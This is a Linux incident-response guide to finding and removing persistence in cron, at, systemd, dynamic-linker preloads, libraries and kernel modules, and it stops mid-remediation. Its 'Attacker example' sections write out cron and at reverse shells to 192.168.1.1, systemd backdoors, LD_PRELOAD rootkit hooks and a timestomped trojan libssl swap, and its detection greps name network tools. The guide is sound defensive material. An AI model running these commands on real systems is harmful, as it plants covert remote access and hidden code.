Scheduled tasks allow an attacker to achieve persistence by configuring a command or script to execute automatically at a defined time or interval. Unlike a process-based persistence mechanism, the scheduled task itself does not require the payload to remain continuously running and will continue to operate across system reboots.

Attackers may abuse legitimate scheduling mechanisms such as cron, anacron, at, batch, fcron and Task Spooler. They may also place task definitions or executable payloads in locations that are unusual for the affected system, including `/tmp`,`/var/tmp`, `/dev/shm`, user home directories, or hidden subdirectories.

During triage, determine:
* Whether the scheduled command uses obfuscation, interpreters, download utilities, privilege escalation, or other suspicious execution techniques.
* Whether the associated process is currently running or has spawned child processes.
* Whether the host has active or recent network connections associated with the scheduled task or its payload.
* Whether the task was created or modified recently, particularly near the initial compromise or another suspicious event.
* Which user created, owns, or executes the task and whether the task runs with elevated privileges.
* Whether the task has executed successfully, failed, or generated output and error files.
* Whether the task definition, referenced script, or associated binaries have been deleted or modified after execution.

On Linux systems, the mechanisms most commonly encountered during an investigation are:
- `cron` and `crontab`.
- `anacron`.
- `at` and `batch`.
- `fcron`.
- Task Spooler (`ts`/`tsp`).
- `systemd` timers.

---

## Persistence mechanism

## Cron

#### How they works
The cron file syntax slightly differs based on the location in which the cron file is created. For the cron files in the /etc/ directory, the user who will execute the job must be specified.
`* * * * * root /bin/bash -c '/srv/backup_tool.sh'`

Conversely, the user who created the cron files in the /var/spool/cron/crontabs/ directory will execute the cron files.
`* * * * * /bin/bash -c '/srv/backup_tool.sh'`

The asterisks are used to create the schedule. They represent (in order) minutes, hours, days (of the month), months and days (of the week). Setting `* * * * *` means the cron job is executed every minute. Use [Crontab Guru](https://crontab.guru/).

#### Primary locations

**User cron:**

| Path | Description |
|---|---|
| `/var/spool/cron/<user>` | User crontab (Debian: `/var/spool/cron/crontabs/<user>`) |

**System cron:**

| Path | Description |
|---|---|
| `/etc/crontab` | System crontab with explicit user column |
| `/etc/cron.d/` | Drop-in cron files, same format as `/etc/crontab` |
| `/etc/cron.hourly/` | Scripts run hourly by cron daemon |
| `/etc/cron.daily/` | Scripts run daily |
| `/etc/cron.weekly/` | Scripts run weekly |
| `/etc/cron.monthly/` | Scripts run monthly |

#### Detection

```bash
# All users' crontabs; don'tt assume that all users have a readable crontab
while IFS=: read -r user _ _ _ _ _ _; do
  crontab -l -u "$user" 2>/dev/null | sed "1s/^/[$user] /"
done < /etc/passwd
# Same as above but it remove all the lines that contain #
for u in $(cut -f1 -d: /etc/passwd); do
  ct=$(crontab -l -u $u 2>/dev/null | grep -v "^#")
  [ -n "$ct" ] && echo "=== $u ===" && echo "$ct"
done

# Check whether cron files are world-writable or owned by an unexpected user
ls -la /etc/crontab /etc/cron.d/ /etc/cron.*/ /var/spool/cron* 2>/dev/null
# Search anomalies:
find /etc/cron* /var/spool/cron* -type f \( -perm /022 -o ! -user root \) 2>/dev/null

# Verify that the cron scripts referenced actually exist and check their hashes
for cron_file in /etc/cron.d/* /var/spool/cron/crontabs/*; do
  [ -f "$cron_file" ] || continue
  while IFS= read -r line; do
    # Estract the command (last column), verify if it exist
    cmd=$(echo "$line" | awk '{print $NF}')
    [ -x "$cmd" ] && sha256sum "$cmd" || echo "MISSING/NOT EXECUTABLE: $cmd"
  done < "$cron_file"
done

# System-wide cron file; check ownership, permissions and content
cat /etc/crontab

# Crontab and Anacron; Checking Scheduled Jobs
sed -n '1,200p' /etc/crontab /etc/anacrontab 2>/dev/null

find /etc/cron.d/ -maxdepth 1 -type f -print0 | xargs -0 sed -n '1,160p'
# Or only listing:
ls -la /etc/cron.d/
# Or only what's inside:
find /etc/cron.d/ -maxdepth 1 -type f -exec cat {} \;

# Find cron scripts executing from suspicious paths
grep -rE "(/tmp|/dev/shm|/var/tmp|/root/\.|bash -c|sh -c|curl |wget |nc |ncat |python|perl|nc -e)" \
  /etc/crontab /etc/cron.d/ /var/spool/cron* 2>/dev/null

# Correlation with logs related to execution
grep CRON /var/log/syslog /var/log/auth.log 2>/dev/null | tail -100
# Same but about systemd:
journalctl -u cron --since "1 hour ago"
journalctl SYSLOG_IDENTIFIER=CRON --no-pager | tail -100
```

#### Remediation

```bash
# Crontab backup before any change
crontab -l -u <username> > /tmp/backup_crontab_<username>.txt

# Edit a user's crontab
crontab -e -u <username>

# Remove a specific malicious job
crontab -l -u <username> | grep -v 'malicious_pattern' | crontab -u <username> -

# Remove all of a user's crontabs; destructive use only after backing up
crontab -r -u <username>

# Remove malicious cron.d file
rm /etc/cron.d/syscheck

# Verify user crontab 
crontab -l -u <username>

# Check cron logs for malicious jobs
grep "CRON" /var/log/syslog* | grep -v "^#" | tail -50
```

#### Attacker example
```bash
# Add a cron job that runs a reverse shell every minute as root
echo "* * * * * root /bin/bash -c 'bash -i >/dev/tcp/192.168.1.1/4444 0<&1'" \
  >> /etc/cron.d/syscheck
```

**Resources**: [Elastic](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms#t1053---scheduled-task/job)

---

## At

#### How they works

At is a utility for scheduling one-time tasks to run at a specified time in the future on Linux systems. The At daemon (atd) manages and executes these scheduled tasks at the specified time, is not present on most Linux distributions by-default.

To schedule a task using At, you simply provide the command to run and the time for execution. The syntax is straightforward:
`echo "/bin/bash -c 'sh -i >& /dev/tcp/192.168.1.1/1337 0>&1'" | at now + 1 minute`.

At job details can be listed using the `atq` command and specific jobs can be removed using `atrm`.

#### Primary locations

| Tool | Location |
|---|---|
| `at` | `/var/spool/cron/atjobs/` where jobs are stored |
| `at` | `/var/spool/cron/atspool/` spool file |

#### Detection

```bash
# Pending jobs; one-time execution
if command -v atq &>/dev/null; then
  atq 2>/dev/null || echo "atq not available"
  for i in $(atq 2>/dev/null | awk '{print $1}'); do 
    echo "=== Job $i ==="; at -c "$i" 2>/dev/null; 
  done
else
  echo "[!] at/batch not installed"
fi
```

#### Remediation

```bash
# Remove at job
atrm <job_id>
```

#### Attacker example

```bash
```

---

## System timers
Text `text` text
#### How they works
#### Primary locations

| Path | Description |
|---|---|
| `/etc/systemd/system/*.timer` | System timers |
| `/usr/lib/systemd/system/*.timer` | Package-installed timers |
| `~/.config/systemd/user/*.timer` | User-scope timers |

#### Detection
```bash
# User timers are not listed by the `systemctl list-timers` command
# They must be checked for each user:
find /home -name "*.timer" 2>/dev/null
# Or via systemctl for each user:
for user in $(cut -f1 -d: /etc/passwd | grep -v "^_"); do
  sudo -u $user systemctl --user list-timers 2>/dev/null
done

# Active and Inactive systemd Timers; Modern Scheduling
systemctl list-timers --all
# Installed timer units; check packages and custom settings
systemctl list-unit-files --type=timer

# Inspect a specific timer and its paired service
systemctl cat <timer_name>.timer
systemctl cat <timer_name>.service
journalctl -u <timer_name>.service
```
#### Remediation
```bash
# Remove malicious systemd timers and services
systemctl stop svc-update.timer svc-update.service
systemctl disable svc-update.timer svc-update.service
rm /etc/systemd/system/svc-update.{timer,service}
systemctl daemon-reload
systemctl reset-failed

# Verify systemd timer
systemctl list-timers --all | grep svc-update
```
#### Attacker example
```bash
# Systemd timer+service backdoor
cat > /etc/systemd/system/svc-update.service << 'EOF'
[Unit]
Description=Service Update
[Service]
ExecStart=/tmp/.svc
EOF

cat > /etc/systemd/system/svc-update.timer << 'EOF'
[Unit]
Description=Service Update Timer
[Timer]
OnBootSec=30s
OnUnitActiveSec=5min
[Install]
WantedBy=timers.target
EOF

systemctl enable --now svc-update.timer
```

---

## Other tools

| Tool | Location |
|---|---|
| `anacron` | `/etc/anacrontab` conf file and `/var/spool/anacron` timestamp last execution |
| `fcron` | `/var/spool/fcron/` and system crontab and `/etc/fcron` conf file |
| `Task Spooler` | |
| `Batch` | it use `/var/spool/at` |

---

# Service and Boot Persistence

### Why it matters

Systemd units execute at boot, on demand, or in response to specific events, making them a natural target for persistence.
A malicious service or timer can run silently in the background as any user, including root and automatically restart if killed, turning a one-time compromise into durable execution across reboots.
Because unit files resemble normal service configuration, attackers can blend into expected system behavior, especially when they abuse drop-ins, user units, or generators.

### Primary locations

**User scope**

| Path                               | Notes                                    |
|------------------------------------|------------------------------------------|
| `~/.config/systemd/user/`          | Per-user units, run in user context      |
| `~/.local/share/systemd/user/`     | Alternative user unit path               |
| `/etc/systemd/user/`               | System-wide user units                   |

**System scope (precedence, higher overrides lower)**

| Path                          | Notes                                      |
|-------------------------------|--------------------------------------------|
| `/etc/systemd/system/`        | Admin-defined units, highest precedence    |
| `/run/systemd/system/`        | Runtime-generated units, wiped on reboot   |
| `/usr/local/lib/systemd/system/` | Local or custom installs               |
| `/usr/lib/systemd/system/`    | Package-installed defaults                 |
| `/lib/systemd/system/`        | Alias to `/usr/lib` on some distributions  |

**High-value sub-locations:**

- **Drop-ins:** `/etc/systemd/system/<name>.service.d/*.conf` override selected directives of an existing service without replacing the base unit
- **Enablement symlinks:** `multi-user.target.wants/`, `default.target.wants/` show which units are activated at boot or login.
- **Runtime units:** `/run/systemd/system/` ephemeral but currently active, important during live response

**Legacy / SysV compatibility:**

| Path | Notes |
|---|---|
| `/etc/init.d/` | Traditional SysV scripts, still used via compatibility |
| `/etc/rc.local` | Runs at end of boot if `rc-local.service` is enabled |
| `/etc/rc*.d/` | SysV runlevel symlinks |

**Systemd generators** (advanced, executed very early at boot to produce unit files):

| Path | Notes |
|---|---|
| `/lib/systemd/system-generators/` | Package-installed generators |
| `/etc/systemd/system-generators/` | Admin-defined generators, executes before units load |
| `/run/systemd/generator/` | Output of generators, wiped on reboot |

> Generators are extremely powerful persistence surfaces: they execute before any unit and can synthesize unit files that look legitimate. Detection requires comparing generator binary hashes against package manifests.

### Detection
- Newly created or recently modified `.service` and `.timer` files in system and user unit directories.
- Drop-ins that alter `ExecStart`, add suspicious `Environment` values, or change `Restart` behavior to make services more resilient.  
- Overrides that shadow vendor units by using the same service name in higher-precedence paths (e.g., `/etc/systemd/system/` overriding `/usr/lib/systemd/system/`).
- User units executing binaries from home directories, hidden paths, or temporary locations such as `/tmp`, `/dev/shm`, `/var/tmp`, or `~/.cache`.  
- Suspicious `WantedBy=` values tying units to boot targets (`multi-user.target`, `default.target`) or timers that trigger periodic execution.
- Use `systemd-analyze unit-paths` to understand precedence and loading order for the current host.  
- Review `systemctl status`, `list-unit-files` and `list-timers` in both system and user modes and use `systemctl cat <unit>` to see the effective content including overrides.  
- Correlate unit configuration with `journalctl -u <unit>` and boot logs to confirm actual execution and timing. 


#### Core commands
```bash
# All systemd unit files (system scope)
systemctl list-unit-files --all --no-pager

# Active and inactive units
systemctl list-units --all --no-pager

# User-mode units (often overlooked)
systemctl --user list-unit-files --all --no-pager 2>/dev/null

# Unit search paths and precedence
systemd-analyze unit-paths 2>/dev/null

# Recently modified services and timers (last 7 days)
find /etc/systemd /usr/lib/systemd /lib/systemd -type f \
  \( -name "*.service" -o -name "*.timer" \) -printf '%T@ %p\n' | sort -rn | head -30

# Effective unit content, including drop-ins
systemctl cat <service_name>

# Drop-ins and overrides
find /etc/systemd/system -type d -name "*.d" -exec find {} -maxdepth 1 -name "*.conf" \; 2>/dev/null

# Target enablement symlinks
ls -lah /etc/systemd/system/multi-user.target.wants/
ls -lah /etc/systemd/system/default.target.wants/

# Enabled user-scope units
systemctl --user list-unit-files --state=enabled
```

#### Hunt for suspicious `ExecStart` and related directives

```bash
# Units executing from suspicious paths or using shells/network tools
grep -rE '^[[:space:]]*(ExecStart|ExecStartPre|ExecStartPost)[[:space:]]*=[[:space:]]*(\.\/|\/tmp|\/dev\/shm|\/var\/tmp|\/root\/\.|bash -c|sh -c|curl |wget |nc |python|perl)' \
  /etc/systemd/system/ /usr/lib/systemd/system/ ~/.config/systemd/ 2>/dev/null
```

#### Legacy persistence: SysV and rc.local

```bash
ls -lah /etc/init.d/
cat /etc/rc.local 2>/dev/null
systemctl status rc-local.service

# Check rc.local content excluding comments and exit
grep -v "^#\|^exit" /etc/rc.local 2>/dev/null

# SysV init scripts and runlevel symlinks
find /etc/init.d /etc/rc*.d -ls 2>/dev/null
```

#### Generators
```bash
ls -lah /usr/lib/systemd/system-generators/ /lib/systemd/system-generators/ 2>/dev/null

# Hash generator binaries (compare against package manifests)
sha256sum /etc/systemd/system-generators/* 2>/dev/null
# Compare against known-good: dpkg -S /etc/systemd/system-generators/<file>
```

#### Runtime units and suspicious metadata

```bash
# Runtime-only units
ls -la /run/systemd/system/ 2>/dev/null || echo "[!] /run/systemd/system/ not found or accessible"
find /run/systemd/system -type f -exec cat {} \; 2>/dev/null

# Compare services present in /run but not in /etc
comm -13 <(find /etc/systemd -name "*.service" | sort) \
         <(find /run/systemd -name "*.service" | sort) | \
  while read f; do echo "=== RUNTIME ONLY: $f ==="; cat "$f"; done

# Unit files that are writable or non-root-owned
find /etc/systemd /usr/lib/systemd /lib/systemd /run/systemd -type f \
  \( -perm /022 -o ! -user root -o -newer /etc/hostname \) 2>/dev/null | \
  while read f; do
    echo "=== SUSPICIOUS: $f ==="
    stat "$f"
    cat "$f"
  done
```

### Preset files and non-service units

```bash
# Preset files that auto-enable/disable services
cat /etc/systemd/system-preset/*.preset 2>/dev/null
cat /usr/lib/systemd/system-preset/*.preset 2>/dev/null
grep -E "enable|disable" /etc/systemd/system-preset/*.preset 2>/dev/null

# Other unit types that may execute code (socket, device, mount, automount)
systemctl list-unit-files --type=socket --all 2>/dev/null
systemctl list-unit-files --type=device --all 2>/dev/null
systemctl list-unit-files --type=mount --all 2>/dev/null
systemctl list-unit-files --type=automount --all 2>/dev/null

# Hunt for Exec* in non-service unit types
find /etc/systemd -type f \( -name "*.socket" -o -name "*.device" -o -name "*.mount" \) | \
  xargs grep -l "Exec" 2>/dev/null
```

#### Correlate with journal

```bash
# Journal history for a specific unit
journalctl -u <service_name> --since "7 days ago"
```

### Remediation

```bash
# Stop and disable malicious unit
systemctl stop <service_name>
systemctl disable <service_name>

# Remove unit file
rm /etc/systemd/system/<service_name>.service

# Remove drop-ins
rm /etc/systemd/system/<service_name>.service.d/override.conf
rmdir /etc/systemd/system/<service_name>.service.d/ 2>/dev/null

# Reload daemon and reset failed state
systemctl daemon-reload
systemctl reset-failed

# Remove enablement symlink if needed
rm /etc/systemd/system/multi-user.target.wants/<service_name>.service

# Legacy and SysV cleanup
# Remove malicious command from rc.local
sed -i '/malicious_command/d' /etc/rc.local

# Disable SysV scripts
update-rc.d <service_name> disable      # Debian/Ubuntu
chkconfig <service_name> off            # RHEL/CentOS
rm /etc/init.d/<service_name>
```

```bash
# Confirm unit is no longer present
systemctl cat <service_name> 2>/dev/null

# Confirm unit is not enabled
systemctl list-unit-files --state=enabled | grep <service_name>

# Check for recent executions
journalctl -u <service_name> --since '1 hour ago'
```

**Attacker example:**

**Malicious service with automatic restart**
```bash
# Malicious system-level service that runs a hidden payload and restarts on failure
cat > /etc/systemd/system/net-monitor.service << 'EOF'
[Unit]
Description=Network Monitor
After=network.target

[Service]
ExecStart=/usr/local/bin/.cache
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Enable and start immediately
systemctl enable --now net-monitor.service
```

**Drop-in override on an existing service**

```bash
# Drop-in that adds a malicious pre-start command to a legitimate service
mkdir -p /etc/systemd/system/cron.service.d/
echo -e "[Service]\nExecStartPre=/tmp/.init" > /etc/systemd/system/cron.service.d/override.conf
```

---

# Loader, Library & Package Persistence

### Why it matters

The dynamic linker (`ld.so`) evaluates `LD_PRELOAD`, `/etc/ld.so.preload` and library search paths before any dynamically linked program runs.  
A malicious shared object preloaded via these mechanisms can intercept core functions (`open`, `read`, `write`, `execve`, `readdir`), hide processes and files and harvest credentials across essentially every userland binary on the system. 
Attackers may also tamper with libraries installed by packages or alter `ld.so` configuration, making persistence difficult to detect without package integrity baselines and dedicated telemetry.

---

## Dynamic linker and LD_PRELOAD persistence

### Primary location

| Path / Surface                         | Description                                                                 |
|----------------------------------------|-----------------------------------------------------------------------------|
| `/etc/ld.so.preload`                   | Global preload file; each listed `.so` loads into every dynamic binary      |
| `LD_PRELOAD` environment variable      | Per-process preload; can be made persistent via shell startup / services    |
| `LD_LIBRARY_PATH` environment variable | Per-process search-path override; can be abused with writable library dirs  |
| `/etc/ld.so.conf`                      | Global library search path configuration                                    |
| `/etc/ld.so.conf.d/*.conf`             | Drop-in library path additions                                              |
| `/etc/ld.so.cache`                     | Binary cache of resolved library paths                                      |
| `/usr/lib/`, `/lib/`, `/usr/local/lib/`| Standard library directories; rootkits often hide here with legit names     |

### Detection

> Goal: find global and per-process preloads, suspicious library paths and non-packaged or recently modified `.so` files.

```bash
# Global preload file – should be empty or absent on hardened systems
cat /etc/ld.so.preload 2>/dev/null && echo "WARNING: preload file exists"

# Search for LD_PRELOAD / LD_LIBRARY_PATH persistence in configs and startup scripts
grep -RInE 'LD_PRELOAD|LD_LIBRARY_PATH' /etc /home /root 2>/dev/null

# Shell startup files (per-user / global)
grep -nE 'LD_PRELOAD|LD_LIBRARY_PATH' \
  ~/.bashrc ~/.bash_profile ~/.zshrc \
  /etc/profile /etc/profile.d/*.sh /etc/bash.bashrc 2>/dev/null

# Systemd unit environment overrides
grep -rE 'Environment=.*LD_' /etc/systemd 2>/dev/null

# Cron-based persistence
grep -rE 'LD_PRELOAD|LD_LIBRARY_PATH' /etc/cron* /var/spool/cron* 2>/dev/null

# PAM-related linker abuse
grep -rE 'LD_PRELOAD|LD_LIBRARY_PATH' /etc/pam.d /etc/security 2>/dev/null

# Library search path configuration
cat /etc/ld.so.conf /etc/ld.so.conf.d/*.conf 2>/dev/null
```

Integrity and packaging:

```bash
# Debian: package integrity (files changed or missing)
debsums -ca 2>/dev/null

# RPM-based: package integrity (files changed or missing)
rpm -Va 2>/dev/null

# Recently created or modified .so files (relative to /etc/passwd)
find /usr/lib /lib /usr/local/lib -name "*.so*" -newer /etc/passwd 2>/dev/null
```

Unpackaged libraries:

```bash
# Libraries not associated with any package (Debian/Ubuntu)
comm -23 \
  <(find /usr/lib /lib -name "*.so*" -type f 2>/dev/null | sort) \
  <(dpkg -L '*' 2>/dev/null | grep '\.so' | sort) 2>/dev/null | \
  while read f; do
    [ -f "$f" ] && echo "UNPACKAGED: $f"
  done

# Libraries not associated with any package (RHEL/CentOS)
comm -23 \
  <(find /usr/lib /lib -name "*.so*" -type f 2>/dev/null | sort) \
  <(rpm -qa --qf '[%{FILENAMES}\n]' 2>/dev/null | grep '\.so' | sort) 2>/dev/null | \
  while read f; do
    [ -f "$f" ] && echo "UNPACKAGED: $f"
  done
```

Loaded by suspicious processes:

```bash
# Processes mapping libraries from /tmp, /var/tmp, /dev/shm or deleted files
find /proc -maxdepth 2 -name maps -type f 2>/dev/null | while read maps_file; do
  pid=$(echo "$maps_file" | cut -d/ -f3)
  if grep -qE '/(tmp|var/tmp|dev/shm)/|\(deleted\)' "$maps_file"; then
    echo "=== PID $pid ==="
    ps -p "$pid" -o pid,cmd= 2>/dev/null || echo "[!] Process vanished"
    grep -E '/(tmp|var/tmp|dev/shm)/|\(deleted\)' "$maps_file"
  fi
done

# Alternative using lsof
lsof -X 2>/dev/null | awk '
  /(tmp|var\/tmp|dev\/shm)/ || /deleted/ {
    pid=$2; cmd=$1
    if (!seen[pid]) {
      print "=== PID " pid " (" cmd ") ==="
      seen[pid]=1
    }
    print $0
  }
'
```

RPATH/RUNPATH and cache:

```bash
# Binaries with RPATH/RUNPATH into temp or nonstandard locations
find /usr/bin /usr/sbin /bin /sbin -type f -executable 2>/dev/null | \
  while read f; do
    rpath=$(readelf -d "$f" 2>/dev/null | grep -E 'RPATH|RUNPATH')
    [ -n "$rpath" ] && echo "=== $f ===" && echo "$rpath"
  done | grep -E '/(tmp|dev/shm|var/tmp)' || echo "[OK] No suspicious RPATH/RUNPATH"

# Suspicious paths in ld.so.cache
strings /etc/ld.so.cache 2>/dev/null | grep -E '/(tmp|dev/shm|var/tmp)'
```

Library load sanity:

```bash
# Test libraries referenced in /etc/ld.so.preload using ldd
if [ -f /etc/ld.so.preload ]; then
  while read lib; do
    [ -z "$lib" ] && continue
    echo "Testing: $lib"
    ldd "$lib" 2>&1 | head -5
  done < /etc/ld.so.preload
fi
```

What to look for:

- Any non-empty `/etc/ld.so.preload` pointing to unexpected paths (e.g. `/tmp/.lib*`, `/usr/local/lib/.hidden.so`).  
- `LD_PRELOAD` or `LD_LIBRARY_PATH` set in global shell profiles, systemd unit `Environment=`, cron scripts, or PAM configs.  
- `.so` files recently created or modified, especially in writable or non-standard directories, or not owned by any package.
- Binaries whose RPATH/RUNPATH points into `/tmp`, `/dev/shm`, or other attacker-controlled directories.  

### Remediation

> Take forensic copies of `/etc/ld.so.preload`, linker configs and suspicious `.so` files (plus hashes and package metadata) before remediation.  

```bash
# Safely neutralize global preload
cp /etc/ld.so.preload /var/tmp/ld.so.preload.evidence 2>/dev/null || true
truncate -s 0 /etc/ld.so.preload 2>/dev/null          # empty file
rm /etc/ld.so.preload 2>/dev/null || true             # remove it if safe

# Strip LD_PRELOAD from startup files
for f in ~/.bashrc ~/.bash_profile ~/.zshrc \
         /etc/profile /etc/bash.bashrc /etc/bashrc \
         /etc/environment /etc/profile.d/*.sh; do
  [ -f "$f" ] && sed -i '/LD_PRELOAD/d' "$f"
done

# Strip LD_LIBRARY_PATH from startup files as well
for f in ~/.bashrc ~/.bash_profile ~/.zshrc \
         /etc/profile /etc/bash.bashrc /etc/bashrc \
         /etc/environment /etc/profile.d/*.sh; do
  [ -f "$f" ] && sed -i '/LD_LIBRARY_PATH/d' "$f"
done

# Remove LD_* from systemd unit overrides
grep -rl 'LD_PRELOAD' /etc/systemd 2>/dev/null | xargs -r sed -i '/LD_PRELOAD/d'
grep -rl 'LD_LIBRARY_PATH' /etc/systemd 2>/dev/null | xargs -r sed -i '/LD_LIBRARY_PATH/d'

# Reinstall packages with tampered libraries (example; use actual package names)
apt-get install --reinstall <package_name>   # Debian/Ubuntu
yum reinstall <package_name>                 # RHEL/CentOS

# Rebuild dynamic linker cache
ldconfig
```

Validation:

```bash
# Ensure global preload is now absent or empty
cat /etc/ld.so.preload 2>/dev/null || echo "[OK] /etc/ld.so.preload absent"

# Re-check package integrity
debsums -ca 2>/dev/null | grep -v "OK"
rpm -Va 2>/dev/null | grep -v '^\.\.\.\.\.\.\.\.[ ]'

# Clean any lingering LD_PRELOAD in profile.d scripts
find /etc/profile.d -maxdepth 1 -name "*.sh" -type f -exec sed -i '/LD_PRELOAD/d' {} \;
```

### Attacker example

```bash
# Global preload: inject rootkit into every dynamically linked process
echo "/tmp/.libaudit.so.1" > /etc/ld.so.preload

# Per-service preload via systemd drop-in (SSH backdoor)
mkdir -p /etc/systemd/system/sshd.service.d/
cat << 'EOF' > /etc/systemd/system/sshd.service.d/preload.conf
[Service]
Environment=LD_PRELOAD=/usr/local/lib/.ssh_hook.so
EOF
systemctl daemon-reload
systemctl restart sshd

# User-level persistence via shell profile
echo 'export LD_PRELOAD=/home/user/.ld_hooks.so' >> /home/user/.bashrc
```

An attacker can compile `.ld_hooks.so` to intercept filesystem or process APIs, hide their own artifacts, or siphon credentials while making normal programs appear to behave correctly.

---

## Package and library integrity persistence

### Primary location

| Path / Surface                          | Description                                                            |
|-----------------------------------------|------------------------------------------------------------------------|
| `/usr/lib/`, `/lib/`, `/usr/local/lib/` | Core and local shared libraries; target for trojanized `.so` / `.a`    |
| Package metadata and logs               | `/var/log/dpkg.log`, `/var/log/apt/history.log`, `/var/log/yum.log`    |
| Package databases                       | `dpkg` status, RPM database (`/var/lib/rpm`)                           |

Attackers may replace libraries or helper binaries that are part of packages, relying on trust in the package name and path to evade detection. 

### Detection

> Goal: identify replaced or non-packaged libraries and binaries backing persistence surfaces (systemd, cron, PAM, SSH, etc.).

```bash
# Global package integrity – changed/missing files
debsums -ca 2>/dev/null
rpm -Va 2>/dev/null

# Recently modified libraries and helper binaries (relative to hostname or passwd)
find /usr/lib /lib /usr/local/lib /usr/bin /usr/sbin \
  -type f -newer /etc/passwd 2>/dev/null | head -100

# Cross-check suspicious files with package ownership
for f in /usr/lib/*.so /lib/*.so /usr/local/lib/*.so; do
  dpkg -S "$f" 2>/dev/null || echo "UNPACKAGED LIB: $f"
done

for f in /usr/bin/* /usr/sbin/*; do
  dpkg -S "$f" 2>/dev/null || echo "UNPACKAGED BIN: $f"
done

# RPM-based equivalent (example)
for f in /usr/lib/*.so /lib/*.so; do
  rpm -qf "$f" 2>/dev/null || echo "UNPACKAGED LIB: $f"
done
```

Logs and timeline:

```bash
# DPKG/APT logs – check for unexpected installs/upgrades around compromise time
grep -Ei 'install|upgrade|remove' /var/log/dpkg.log /var/log/apt/history.log 2>/dev/null | tail -100

# YUM/DNF logs
grep -Ei 'install|update|remove' /var/log/yum.log /var/log/dnf.log 2>/dev/null | tail -100
```

What to look for:

- Core libraries (e.g., `libc.so`, libssl, libpam) or helper binaries with:
  - Recent modification times inconsistent with package logs.  
  - Non-root owners or unexpected permissions.  
  - Missing package ownership or failing integrity checks. 
- Unpackaged `.so` under system library directories, especially with names mimicking legitimate components.  

### Remediation

> As always, copy suspicious libraries/binaries and record hashes before replacing them.

```bash
# Backup suspicious library (example)
cp /usr/lib/x86_64-linux-gnu/libc.so.6 /var/tmp/libc.so.6.evidence 2>/dev/null

# Restore from vendor packages
apt-get install --reinstall libc6 libssl-dev libpam-modules   # adjust to affected packages
yum reinstall glibc openssl pam                               # RPM-based equivalent

# Rebuild library cache
ldconfig

# Lock down permissions on library directories
chmod 755 /usr/lib /lib /usr/local/lib
chown root:root /usr/lib /lib /usr/local/lib
```

Validation:

```bash
# Re-run integrity checks
debsums -ca 2>/dev/null | grep -v "OK"
rpm -Va 2>/dev/null | grep -v '^\.\.\.\.\.\.\.\.[ ]'

# Spot-check key libraries
ls -la /usr/lib/x86_64-linux-gnu/libc.so.6 /lib/x86_64-linux-gnu/libc.so.6 2>/dev/null
```

### Attacker example

```bash
# Replace a package-managed library with a trojan that runs code on every use
cp /usr/lib/x86_64-linux-gnu/libssl.so.1.1{,.bak}
cp /tmp/libssl_evil.so.1.1 /usr/lib/x86_64-linux-gnu/libssl.so.1.1
chmod 644 /usr/lib/x86_64-linux-gnu/libssl.so.1.1
touch -r /usr/bin/ssh /usr/lib/x86_64-linux-gnu/libssl.so.1.1   # timestomp to blend in

# Combine with LD_PRELOAD to force a rootkit library everywhere
echo "/usr/lib/x86_64-linux-gnu/librootkit.so" >> /etc/ld.so.preload

# Or hook only specific processes via cron/systemd that set LD_PRELOAD
echo 'LD_PRELOAD=/usr/local/lib/.hook.so /usr/bin/sshd -D' >> /etc/cron.hourly/netmon
```

By hijacking the dynamic linker (T1574.006) and package-owned libraries, attackers gain broad execution inside trusted processes and can maintain persistence that is hard to spot without strong integrity monitoring and linker-specific detection. 

---

# Kernel & Boot chain Persistence

### Why it matters

Kernel modules and boot-chain components execute with the highest privilege level on Linux and can hide processes, files and network traffic from all standard user-space monitoring. 
Malicious loadable kernel modules (LKMs) and boot-time hooks provide stealthy persistence that survives userspace cleaning, often leaving only subtle signals such as taint flags, unusual module loads, or modified initramfs/bootloader configuration.

Common abuse patterns:

- LKMs acting as rootkits, loaded at boot via `/etc/modules`, `modules-load.d`, or initramfs scripts.  
- Tampered module configuration (`/etc/modprobe.d`) to hide or replace legitimate drivers.  
- Modified kernel images, initramfs contents, or GRUB configuration to inject early-boot payloads.  

---

## Kernel module (LKM) persistence

### Primary location

| Path / Surface                               | Description                                                  |
|----------------------------------------------|--------------------------------------------------------------|
| `/lib/modules/<kernel_version>/`             | On-disk kernel module `.ko` files for the active kernel      |
| `/etc/modules`                               | List of modules auto-loaded at boot (Debian/Ubuntu)          |
| `/etc/modules-load.d/*.conf`                 | systemd module-load configs for early boot                   |
| `/etc/modprobe.d/*.conf`                     | Module options, aliases and blacklists                      |
| `/proc/modules`, `lsmod`                     | View currently loaded modules                                |
| `/proc/sys/kernel/tainted`                   | Kernel taint flags (unsigned/out-of-tree module signals)     |

### Detection

> Goal: identify unexpected LKMs, auto-load configuration and rootkit indicators (taint, non-packaged modules, unusual paths).

```bash
# Currently loaded modules (snapshot)
lsmod | sort

# Module metadata: path, version, signer, description
for mod in $(lsmod | awk 'NR>1 {print $1}'); do
  modinfo "$mod" 2>/dev/null
done

# Auto-load modules at boot (Debian/Ubuntu + systemd)
cat /etc/modules 2>/dev/null
cat /etc/modules-load.d/*.conf 2>/dev/null

# Blacklists, aliases and options – look for hiding/replacing modules
find /etc/modprobe.d -type f -name "*.conf" 2>/dev/null | \
  while read f; do
    echo "=== $f ==="
    grep -vE '^[[:space:]]*#|^[[:space:]]*$' "$f"
  done

# On-disk module files – ownership, timestamps and location
find /lib/modules -type f \( -name '*.ko' -o -name '*.ko.*' \) -ls 2>/dev/null

# Kernel logs: module loads, taint, secure boot, lockdown
dmesg -T | grep -iE 'module|taint|secure boot|lockdown' 2>/dev/null

# Kernel taint flag – non-zero suggests unsigned/out-of-tree modules
cat /proc/sys/kernel/tainted 2>/dev/null || echo "[!] Cannot read taint flag"

# Secure Boot / module-signing state (where available)
mokutil --sb-state 2>/dev/null || echo "[!] Secure Boot state not available"
```

What to look for:

- Modules loaded that do not match the expected hardware/software profile of the host (e.g. rare drivers or custom names).
- `.ko` files with recent timestamps or unusual paths under `/lib/modules/<kernel_version>/kernel/*`.  
- Entries in `/etc/modules` or `/etc/modules-load.d/*.conf` referencing suspicious module names or paths.  
- `modprobe.d` configs that:
  - Blacklist legitimate drivers to hide hardware activity.  
  - Introduce aliases redirecting expected modules to attacker-controlled ones.  
- Non-zero `kernel/tainted` or dmesg messages such as “module verification failed: signature and/or required key missing – tainting kernel”. 

### Remediation

> Preserve evidence first: copy suspicious `.ko` files, `/etc/modules*`, `/etc/modules-load.d/*`, `/etc/modprobe.d/*` and kernel logs before changes. 

```bash
# Unload the malicious module (may require -f on some kernels)
rmmod <module_name> 2>/dev/null || rmmod -f <module_name> 2>/dev/null

